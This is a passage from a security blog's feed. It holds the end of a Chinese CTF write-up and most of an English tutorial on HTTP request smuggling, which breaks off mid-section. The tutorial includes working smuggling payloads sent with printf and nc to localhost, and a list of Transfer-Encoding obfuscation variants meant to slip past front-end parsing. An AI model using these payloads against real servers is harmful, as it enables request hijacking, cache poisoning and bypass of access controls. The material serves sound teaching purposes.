&#x4E2D;&#x4E00;&#x6B21;&#xFF0C;&#x7B2C;&#x4E8C;&#x5929;&#x7ECF;&#x8FC7; @rebirth &#x7684;&#x6DF1;&#x523B;&#x6307;&#x70B9;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;&#x4E00;&#x4E0B;&#x5EF6;&#x8FDF;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x670D;&#x52A1;&#x5668;&#x54CD;&#x5E94;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x6210;&#x529F;&#x7387;&#x5F97;&#x5230;&#x4E86;&#x5F88;&#x5927;&#x7684;&#x63D0;&#x9AD8;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x6B21;&#x90FD;&#x53EF;&#x4EE5; getflag&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png" alt></p><p>&#x811A;&#x672C;&#x653E;&#x5728;<a href="https://gist.github.com/ZeddYu/42159da911e82dba923b375a9f64ad65" target="_blank" rel="noopener">gist-exp.py</a>&#xFF0C;&#x5176;&#x4E2D; 192.168.34.1 &#x662F;&#x672C;&#x5730;&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF0C;192.168.151.132 &#x662F; client &#x7684;&#x5730;&#x5740;&#x3002;</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/" target="_blank" rel="noopener">20191228-hxp36c3ctf</a></p><p><a href="https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0" target="_blank" rel="noopener">https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</a></p><p><a href="https://ctftime.org/task/10211" target="_blank" rel="noopener">https://ctftime.org/task/10211</a></p>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/</id>
        <title><![CDATA[Help you understand HTTP Smuggling in one article]]></title>
        <updated>2020-04-11T11:55:30+08:00</updated>
        <link href="https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/"><![CDATA[<p>This year&#x2019;s Defcon 27 and Black Hat both mentioned HTTP DESYNC ATTACKS. I wanted to take the time to study it a few months ago, but I haven&#x2019;t had much time. I recently took a look at it.</p><p>Sorry for my bad English. If you can read Chinese, I recommend you to read this in Chinese. The Chinese part is here <a href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/">&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x8BFB;&#x61C2; HTTP Smuggling &#x653B;&#x51FB;</a>.</p><a id="more"></a><p>When I researched the other day, it happened that <strong>mengchen@Knownsec 404 Team</strong> also published an <a href="https://paper.seebug.org/1049/" target="_blank" rel="noopener">article</a>, which also brought me more inspiration. The author&#x2019;s article is very good. I strongly recommend reading it. Here I combine the author&#x2019;s article with some of my own understanding. This article can also be understood as a supplement and a more detailed description of that article.</p><p>The entire article was delayed for about two months because of my time. The middle time interval may be longer, so the article will have more omissions, please forgive me. It is not easy to write. Recently, I have been paying attention to this aspect of security issues. Welcome to study and discuss together: ) Contact: emVkZHl1Lmx1QGdtYWlsLmNvbQ==</p><p>In the future, if there is a new summary, I will also send my <a href="https://blog.zeddyu.info">blog</a>.</p><h1 id="TL-NR"><a href="#TL-NR" class="headerlink" title="TL;NR"></a>TL;NR</h1><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205171217.jpeg" alt></p><p>Pic from <a href="https://twitter.com/SpiderSec/status/1200413390339887104?s=19" target="_blank" rel="noopener">https://twitter.com/SpiderSec/status/1200413390339887104?s=19</a></p><h1 id="TimeLine"><a href="#TimeLine" class="headerlink" title="TimeLine"></a>TimeLine</h1><p>Before we mention HTTP Smuggling, let&#x2019;s take a look at the evolution process:</p><p>@Amit Klein proposed the <a href="https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf" target="_blank" rel="noopener">HTTP Response Splitting</a> technology in 2004, which is the prototype of the HTTP Smuggling attack.</p><p>About HTTP Smuggling This attack method was first proposed by @Watchfire in 2005 <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">HTTP Request Smuggling</a>.</p><p>HTTP Parameter Pollution (HPP), also known as HTTP parameter pollution, is actually a special HTTP Smuggling attack. It was first proposed by @Stefano di Paola &amp; @Luca Carettoni at the OWASP Poland conference in 2009. It caused a big sensation and was widely used in bypassing WAF.</p><p>Defcon 24 in 2016, @regilero proposed <a href="[https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-% 20Regilero-Hiding-Wookiees-In-Http.pdf] (https://media.defcon.org/DEF CON 24 / DEF CON 24 presentations / DEF CON 24-Regilero-Hiding-Wookiees-In-Http.pdf">Hiding Wookiees In Http</a>), Further reveals the HTTP Smuggling attack.</p><p>Defcon 27 in 2019, @James Kettle proposed <a href="[https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON- 27-albinowax-HTTP-Desync-Attacks.pdf] (https://media.defcon.org/DEF CON 27 / DEF CON 27 presentations / DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf">HTTP Desync Attacks: Smashing into the Cell Next Door</a>), explained How to use PayPal vulnerability with HTTP Smuggling technology.</p><h1 id="Causes"><a href="#Causes" class="headerlink" title="Causes"></a>Causes</h1><p>However, @James Kettle&#x2019;s PPT did not describe in detail what the attack was and how it was formed. At first, I still had very big doubts after reading it. Then I learned about the <a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">HTTP Smuggling&#x2019;s in the @regilero blog. Article</a>, I have a clear understanding.</p><h2 id="HTTP-Connection-Mod"><a href="#HTTP-Connection-Mod" class="headerlink" title="HTTP Connection Mod"></a>HTTP Connection Mod</h2><p>In the protocol design before <code>HTTP1.0</code>, every time a client makes an HTTP request, it needs to establish a TCP connection with the server. Modern web site pages are composed of multiple resources. We need to obtain the content of a web page, not only request HTML documents, but also various resources such as JS, CSS, and images. , It will cause the load overhead of the HTTP server to increase. So in <code>HTTP1.1</code>,<code>Keep-Alive</code> and <code>Pipeline</code> were added.</p><h3 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep-Alive"></a>Keep-Alive</h3><p>According to <a href="https://tools.ietf.org/html/rfc7230#section-6" target="_blank" rel="noopener">RFC7230</a>:</p><blockquote><p>&#x200B;    HTTP/1.1 defaults to the use of &#x201C;persistent connections&#x201D;, allowing multiple requests and responses to be carried over a single connection.  The &#x201C;close&#x201D; connection option is used to signal that a connection will not persist after the current request/response.  HTTP implementations SHOULD support persistent connections.</p></blockquote><p>Keep-Alive is used by default in HTTP/1.1, allowing multiple requests and responses to be hosted on a single connection.</p><blockquote><p>&#x200B;    The so-called <code>Keep-Alive</code>, is to add a special request header <code>Connection: Keep-Alive</code> in the HTTP request, tell the server, after receiving this HTTP request, do not close the TCP link, followed by the same target server HTTP Request, reuse this TCP link, so only need to perform a TCP handshake process, which can reduce server overhead, save resources, and speed up access. Of course, this feature is enabled by default in <code>HTTP1.1</code>.</p></blockquote><p>Of course, some requests carry <code>Connection: close</code>, after the communication is completed, the server will interrupt the TCP connection.</p><h3 id="Pipline"><a href="#Pipline" class="headerlink" title="Pipline"></a>Pipline</h3><blockquote><p>With <code>Keep-Alive</code>, there will be a <code>Pipeline</code>, and the client can send its own HTTP request like a pipeline without waiting for the response from the server. After receiving the request, the server needs to follow the first-in first-out mechanism, strictly correlate the request and response, and then send the response to the client.</p><p>Nowadays, the browser does not enable <code>Pipeline</code> by default, but the general server provides support for <code>Pipleline</code>.</p></blockquote><p>The more important introduction in HTTP / 1.1 is the pipeline technology. The following is a comparison chart with and without piepeline technology:</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191017234109.png" alt></p><p>We can clearly see that after using the pipeline, there is no need to wait for the previous request to complete its response before processing the second request. This is like asynchronous processing.</p><h2 id="Message-Body"><a href="#Message-Body" class="headerlink" title="Message Body"></a>Message Body</h2><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7230#section-3.3</a></p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><blockquote><pre><code>Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6).  However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP&apos;s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.</code></pre></blockquote><p>Transfer-Encoding is a field designed to support the secure transmission of binary data by 7-bit transfer services. It is somewhat similar to Content-Transfer-Encoding in the MIME (Multipurpose Internet Mail Extensions) header. In the case of HTTP, Transfer-Encoding is mainly used to encode the payload body in a specified encoding form for secure transmission to the user. Introduced in HTTP/1.1 and deprecated in HTTP/2.</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank" rel="noopener">MDN</a> lists several attributes:</p><figure class="highlight coq hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunked | <span class="hljs-type">compress</span> | <span class="hljs-type">deflate</span> | <span class="hljs-type">gzip</span> | <span class="hljs-type">identity</span></span><br></pre></td></tr></table></figure><p>Here we mainly focus on chunked, a transmission encoding method, which is not mentioned for the first time in a network attack. It also used in bypassing WAF frequently.</p><p>We can see the definition specification of chunk transmission in <a href="https://tools.ietf.org/html/rfc7230#section-4.1" target="_blank" rel="noopener">RFC7230</a>.</p><blockquote><p>4.1.  Chunked Transfer Coding</p><p>   The chunked transfer coding wraps the payload body in order to<br>   transfer it as a series of chunks, each with its own size indicator,<br>   followed by an OPTIONAL trailer containing header fields.  Chunked<br>   enables content streams of unknown size to be transferred as a<br>   sequence of length-delimited buffers, which enables the sender to<br>   retain connection persistence and the recipient to know when it has<br>   received the entire message.</p><pre><code>chunked-body   = *chunk                 last-chunk                 trailer-part                 CRLFchunk          = chunk-size [ chunk-ext ] CRLF                 chunk-data CRLFchunk-size     = 1*HEXDIGlast-chunk     = 1*(&quot;0&quot;) [ chunk-ext ] CRLFchunk-data     = 1*OCTET ; a sequence of chunk-size octets</code></pre><p>   The chunk-size field is a string of hex digits indicating the size of<br>   the chunk-data in octets.  The chunked transfer coding is complete<br>   when a chunk with a chunk-size of zero is received, possibly followed<br>   by a trailer, and finally terminated by an empty line.</p><p>   A recipient MUST be able to parse and decode the chunked transfer<br>   coding.</p><p>4.1.1.  Chunk Extensions</p><p>   The chunked encoding allows each chunk to include zero or more chunk<br>   extensions, immediately following the chunk-size, for the sake of<br>   supplying per-chunk metadata (such as a signature or hash),<br>   mid-message control information, or randomization of message body<br>   size.</p><pre><code>chunk-ext      = *( &quot;;&quot; chunk-ext-name [ &quot;=&quot; chunk-ext-val ] )chunk-ext-name = tokenchunk-ext-val  = token / quoted-string</code></pre><p>   The chunked encoding is specific to each connection and is likely to<br>   be removed or recoded by each recipient (including intermediaries)<br>   before any higher-level application would have a chance to inspect<br>   the extensions.  Hence, use of chunk extensions is generally limited</p><p>   to specialized HTTP services such as &#x201C;long polling&#x201D; (where client and<br>   server can have shared expectations regarding the use of chunk<br>   extensions) or for padding within an end-to-end secured connection.</p><p>   A recipient MUST ignore unrecognized chunk extensions.  A server<br>   ought to limit the total length of chunk extensions received in a<br>   request to an amount reasonable for the services provided, in the<br>   same way that it applies length limitations and timeouts for other<br>   parts of a message, and generate an appropriate 4xx (Client Error)<br>   response if that amount is exceeded.</p></blockquote><p>If you don&#x2019;t want to look too carefully here, we just need to understand what kind of structure it is. You can also refer to <a href="https://en.wikipedia.org/wiki/Chunked_transfer_encoding" target="_blank" rel="noopener">Wiki: Chunked transfer encoding</a>, for example if we want to send the following message using chunked.</p><figure class="highlight taggerscript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wikipedia in<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>chunks.</span><br></pre></td></tr></table></figure><p>We can send it like this:</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POSTT</span> <span class="hljs-string">/xxx</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: xxx</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/plain </span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">4\r\n</span></span><br><span class="line"><span class="hljs-attribute">Wiki\r\n</span></span><br><span class="line"><span class="hljs-attribute">5\r\n</span></span><br><span class="line"><span class="hljs-attribute">pedia\r\n</span></span><br><span class="line"><span class="hljs-attribute">e\r\n</span></span><br><span class="line"> in\r\n\r\nchunks.\r\n</span><br><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br></pre></td></tr></table></figure><p>Here is a brief explanation. <strong>We use <code>\r\n</code> for CRLF, so<code>\r\n</code> is two bytes </strong>; the first number 4 indicates that there will be 4 bytes data next, which is the 4 letters of Wiki, and according to the RFC document standard, the letter Wiki part needs to be followed by <code>\r\n</code> to indicate the chunk-data part, and the number 4 needs to be followed by<code>\r\n</code> to indicate the chunk -size part, and the number is a hexadecimal number, such as the third data.</p><figure class="highlight taggerscript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line">in<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>chunks.<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></table></figure><p>Here the first space exists, the <code>\r\n</code> in the data counts two characters, and the last<code>\r\n</code> indicates the end of the data. In this case, the first space is 1 byte + in 2 bytes letter + 2 <code>\r\n</code> counts 4 bytes + &#x2018;chunks.&#x2019; 7 bytes letter = 14 bytes, 14 is &#x2018;e&#x2019; in hexadecimal.</p><p>The last <code>0\r\n\r\n</code> indicates the end of the chunk section.</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>In itself, these things are not harmful, they are used to increase the network transmission rate in various ways, but in some special cases, some corresponding security problems will occur.</p><blockquote><p>&#x200B;    In order to improve the user&#x2019;s browsing speed, improve the user experience, and reduce the burden on the server, many websites use the CDN acceleration service. The simplest acceleration service is to add a reverse proxy server with caching function in front of the source station. When the user requests some static resources, it can be obtained directly from the proxy server without having to obtain it from the source server. This has a very typical topology.</p></blockquote><p>Here is a picture from @mengchen :</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191208142728.png" alt></p><p>Generally speaking, the reverse proxy and back-end server will not use pipeline technology, or even keep-alive. The measures taken by the reverse proxy is to reuse the TCP connection, because compare with the reverse proxy and back-end server, the reverse proxy server and the back-end server IP are relatively fixed, and requests from different users establish a link with the back-end server through the proxy server, and the TCP link between the two is reused.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132520.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132258.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132605.png" alt></p><blockquote><p>&#x200B;    When we send a fuzzy HTTP request to the proxy server, because the implementation of the two servers is different, the proxy server may consider this to be a HTTP request and then forward it to the source server of the back-end. However, after the source server is parsed, only part of it is a normal request, and the remaining part is a smuggling request. When the part affects the normal user&#x2019;s request, the HTTP smuggling attack is implemented.</p></blockquote><p>The HTTP Smuggling attack is based on the inconsistency between the reverse proxy and the backend server in parsing and processing HTTP requests. Using this difference, we can embed another HTTP request in order to achieve our purpose of &#x201C;smuggling&#x201D; the request. It directly shows that we can access intranet services or cause some other attacks.</p><h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><p>Since it is based on analytical differences, what analytical differences will we have? The scenario is the scenario above, but we simplify it and fix the back-end server to one, there is no certain probability. In other words, the architecture is similar to the following diagram:</p><figure class="highlight gherkin hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">|<span class="hljs-string">------A-------&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">-------A------&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">               </span>|</span><br></pre></td></tr></table></figure><p>We know that both Content-Length and Transfer-Encoding can be used as a way to process the body during POST data transmission. In order to facilitate reading and writing, we have the following shorthand rules for field processing priority rules:</p><ul><li>CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.</li><li>TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.</li></ul><p>And Front represents a typical front-end server such as a reverse proxy, and Backend represents a back-end business server that processes requests. In the following, <code>\r\n</code> is used instead of CRLF, and the length is two bytes.</p><h3 id="Chunks-Priority-On-Content-Length"><a href="#Chunks-Priority-On-Content-Length" class="headerlink" title="Chunks Priority On Content-Length"></a>Chunks Priority On Content-Length</h3><p>Some may see that this will have the same confusion as me. Is the RFC document not standardized for CL &amp; TE parsing priorities? Yes, we can read  <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC 7230 Message Body Length</a>:</p><blockquote><p>&#x200B;    If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length.  Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting  (Section 9.4) and ought to be handled as an error.  A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p></blockquote><p>Although it is pointed out that TL takes precedence over CL, we can still bypass it in some ways, or that the middleware is not implemented in accordance with this RFC standard specification, which leads to differences.</p><p>For example, we use the following code to send an HTTP request:</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET / HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-length:56\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tmp HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tests HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></table></figure><p>The above correct resolution should be resolved into three requests:</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Content-length:56</span></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tmp</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></table></figure><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tests</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></table></figure><p>If there is a TE &amp; CL priority problem, it will be parsed into two requests:</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1[CRLF]</span><br><span class="line"><span class="hljs-attribute">Host:localhost[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">Content-length:56[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked[CRLF] (ignored and removed, hopefully)</span><br><span class="line"><span class="hljs-attribute">Dummy:Header[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">[CRLF]</span></span><br><span class="line">0[CRLF]  (start of 56 bytes of body)</span><br><span class="line">[CRLF]</span><br><span class="line">GET /tmp HTTP/1.1[CRLF]</span><br><span class="line"><span class="hljs-attribute">Host:localhost[CRLF]</span></span><br><span class="line">Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)</span><br></pre></td></tr></table></figure><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tests</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></table></figure><h3 id="Bad-Chunked-Transmission"><a href="#Bad-Chunked-Transmission" class="headerlink" title="Bad Chunked Transmission"></a>Bad Chunked Transmission</h3><p>According to <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC7230 section 3.3.3</a> &#xFF1A;</p><blockquote><p>If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.</p></blockquote><p>When receiving <code>Transfer-Encoding: chunked, zorg</code>, it should return a 400 error.</p><p>We have a lot payloads to bypass it. Such as:</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: x</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding:[tab]chunked</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"> Transfer-Encoding: chunked</span><br><span class="line"><span class="hljs-attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span></span><br><span class="line"> : chunked</span><br></pre></td></tr></table></figure><h3 id="Null-In-Headers"><a href="#Null-In-Headers" class="headerlink" title="Null In Headers"></a>Null In Headers</h3><p>This problem is more likely to occur in some middleware servers written in C language, because <code>\0</code> stands for the end of string character in C language. When used in the header, if we use<code>\0</code>, some middleware may appear abnormal Parsing.</p><p>Such as:</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span></span><br><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET / HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-\0dummy: foo\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;length: 56\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tmp HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tests HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></table></figure><p>When some middleware processes the above request, when it encounters <code>\0</code>, it will continue to read lines, which will also cause parsing differences.</p><h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p>According to <a href="https://tools.ietf.org/html/rfc7230#section-3.5" target="_blank" rel="noopener">RFC7320 section-3.5</a>:</p><blockquote><p>Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR.</p></blockquote><p>In other words, in addition to CRLF, we can also use LF as EOL, but in the version of Node.js &lt;5.6.0, the handling of CRLF is also more interesting:</p><figure class="highlight markdown hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">CR</span>] + ? == [<span class="hljs-string">CR</span>][<span class="hljs-symbol">LF</span>]//true</span><br></pre></td></tr></table></figure><p>Suppose we have a Front server that parses CRLF normally, and the backend is a Node.js service with this vulnerability. We can send the following request:</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 